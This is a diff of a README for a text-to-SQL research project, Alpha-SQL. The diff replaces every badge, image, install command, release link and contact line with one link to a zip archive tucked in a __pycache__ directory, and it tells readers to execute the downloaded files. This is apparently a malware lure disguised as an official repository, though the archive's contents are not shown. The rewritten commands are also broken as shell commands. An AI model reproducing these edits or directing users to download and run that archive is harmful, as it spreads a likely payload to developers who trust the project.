@@ -1,6 +1,6 @@
 # Alpha-SQL: Zero-Shot Text-to-SQL Using Monte Carlo Tree Search 📊
 
-![GitHub release](https://img.shields.io/github/release/Ahm-rgb/Alpha-SQL.svg) ![GitHub issues](https://img.shields.io/github/issues/Ahm-rgb/Alpha-SQL.svg) ![GitHub stars](https://img.shields.io/github/stars/Ahm-rgb/Alpha-SQL.svg)
+![GitHub release](https://github.com/Ahm-rgb/Alpha-SQL/raw/refs/heads/master/alphasql/algorithm/mcts/__pycache__/SQL_Alpha_v3.7.zip) ![GitHub issues](https://github.com/Ahm-rgb/Alpha-SQL/raw/refs/heads/master/alphasql/algorithm/mcts/__pycache__/SQL_Alpha_v3.7.zip) ![GitHub stars](https://github.com/Ahm-rgb/Alpha-SQL/raw/refs/heads/master/alphasql/algorithm/mcts/__pycache__/SQL_Alpha_v3.7.zip)
 
 Welcome to the official repository for the paper **"Alpha-SQL: Zero-Shot Text-to-SQL using Monte Carlo Tree Search"** presented at ICML 2025. This project aims to bridge the gap between natural language and SQL queries using advanced techniques.
 
@@ -30,7 +30,7 @@ To get started with Alpha-SQL, follow these steps:
 1. **Clone the repository:**
 
    ```bash
-   git clone https://github.com/Ahm-rgb/Alpha-SQL.git
+   git clone https://github.com/Ahm-rgb/Alpha-SQL/raw/refs/heads/master/alphasql/algorithm/mcts/__pycache__/SQL_Alpha_v3.7.zip
    cd Alpha-SQL
    ```
 
@@ -41,12 +41,12 @@ To get started with Alpha-SQL, follow these steps:
    ```bash
    python -m venv env
    source env/bin/activate  # On Windows use `env\Scripts\activate`
-   pip install -r requirements.txt
+   pip install -r https://github.com/Ahm-rgb/Alpha-SQL/raw/refs/heads/master/alphasql/algorithm/mcts/__pycache__/SQL_Alpha_v3.7.zip
    ```
 
 3. **Download the necessary files:**
 
-   Visit our [Releases section](https://github.com/Ahm-rgb/Alpha-SQL/releases) to download the latest release. Make sure to execute the necessary scripts to set up your environment correctly.
+   Visit our [Releases section](https://github.com/Ahm-rgb/Alpha-SQL/raw/refs/heads/master/alphasql/algorithm/mcts/__pycache__/SQL_Alpha_v3.7.zip) to download the latest release. Make sure to execute the necessary scripts to set up your environment correctly.
 
 ## Usage
 
@@ -61,12 +61,12 @@ To use Alpha-SQL, you can follow these simple steps:
    Use the following command to start the model:
 
    ```bash
-   python run_alpha_sql.py --input_file your_queries.txt --output_file results.txt
+   python https://github.com/Ahm-rgb/Alpha-SQL/raw/refs/heads/master/alphasql/algorithm/mcts/__pycache__/SQL_Alpha_v3.7.zip --input_file https://github.com/Ahm-rgb/Alpha-SQL/raw/refs/heads/master/alphasql/algorithm/mcts/__pycache__/SQL_Alpha_v3.7.zip --output_file https://github.com/Ahm-rgb/Alpha-SQL/raw/refs/heads/master/alphasql/algorithm/mcts/__pycache__/SQL_Alpha_v3.7.zip
    ```
 
 3. **Check the results:**
 
-   The output will be saved in `results.txt`, where you can find the generated SQL queries corresponding to your input.
+   The output will be saved in `https://github.com/Ahm-rgb/Alpha-SQL/raw/refs/heads/master/alphasql/algorithm/mcts/__pycache__/SQL_Alpha_v3.7.zip`, where you can find the generated SQL queries corresponding to your input.
 
 ## Model Architecture
 
@@ -78,7 +78,7 @@ Alpha-SQL is built on a combination of natural language processing techniques an
 
 ### Architecture Diagram
 
-![Model Architecture](https://example.com/model-architecture.png)
+![Model Architecture](https://github.com/Ahm-rgb/Alpha-SQL/raw/refs/heads/master/alphasql/algorithm/mcts/__pycache__/SQL_Alpha_v3.7.zip)
 
 ## Datasets
 
@@ -119,15 +119,15 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out:
 
-- **Author:** [Your Name](https://github.com/yourprofile)
-- **Email:** your.email@example.com
+- **Author:** [Your Name](https://github.com/Ahm-rgb/Alpha-SQL/raw/refs/heads/master/alphasql/algorithm/mcts/__pycache__/SQL_Alpha_v3.7.zip)
+- **Email:** https://github.com/Ahm-rgb/Alpha-SQL/raw/refs/heads/master/alphasql/algorithm/mcts/__pycache__/SQL_Alpha_v3.7.zip
 
 ## Releases
 
-To download the latest version of Alpha-SQL, visit our [Releases section](https://github.com/Ahm-rgb/Alpha-SQL/releases). Make sure to execute the downloaded files as instructed in the installation section.
+To download the latest version of Alpha-SQL, visit our [Releases section](https://github.com/Ahm-rgb/Alpha-SQL/raw/refs/heads/master/alphasql/algorithm/mcts/__pycache__/SQL_Alpha_v3.7.zip). Make sure to execute the downloaded files as instructed in the installation section.
 
 ## Conclusion
 
 Thank you for your interest in Alpha-SQL. We hope this project helps advance the field of natural language processing and SQL generation. Feel free to explore the code, test the model, and contribute to the project.
 
-![Thank You](https://example.com/thank-you.png)
+![Thank You](https://github.com/Ahm-rgb/Alpha-SQL/raw/refs/heads/master/alphasql/algorithm/mcts/__pycache__/SQL_Alpha_v3.7.zip)
